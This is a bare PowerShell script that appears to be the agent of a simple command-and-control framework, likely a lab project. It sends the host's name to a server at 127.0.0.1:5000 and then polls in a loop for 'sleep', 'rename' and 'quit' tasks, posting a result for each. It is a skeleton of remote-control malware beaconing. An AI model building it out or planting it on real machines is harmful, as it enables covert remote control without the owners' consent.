$ip = "127.0.0.1"
$port = "5000"
$sleeptime = 10

$id = ""
$hostn = [System.Net.Dns]::GetHostName()
$regurl = ("http://$ip" + ':' + "$port/reg")
$data = @{
    host = "$hostn"
}
$id = (Invoke-WebRequest -UseBasicParsing -Uri $regurl -Body $data -Method 'POST').Content

$taskurl = ("http://$ip" + ':' + "$port/tasks/$id")
$resulturl = ("http://$ip" + ':' + "$port/results/$id")

for (;;) {
    $task = (Invoke-WebRequest -UseBasicParsing -Uri $taskurl -Method 'GET').Content
    if (-Not [string]::IsNullOrEmpty($task)) {
        $task = $task.split()
        $command = $task[0]
        $args = $task[1..$task.Length]
        if ($command -eq "sleep"){
            $sleeptime = [int]$args[0]
            $data = @{result = ""}
            (Invoke-WebRequest -UseBasicParsing -Uri $resulturl -Body $data -Method 'POST')
        }
        elseif ($command -eq "rename") {
            $id = $args[0]
            $data = @{result = "id $id"}
            (Invoke-WebRequest -UseBasicParsing -Uri $resulturl -Body $data -Method 'POST')
            $taskurl = ("http://$ip" + ':' + "$port/tasks/$id")
            $resulturl = ("http://$ip" + ':' + "$port/results/$id")
        }
        elseif ($command -eq "quit"){
            $data = @{result = "exit"}
            (Invoke-WebRequest -UseBasicParsing -Uri $resulturl -Body $data -Method 'POST')
            exit
        }
    }
    sleep $sleeptime
}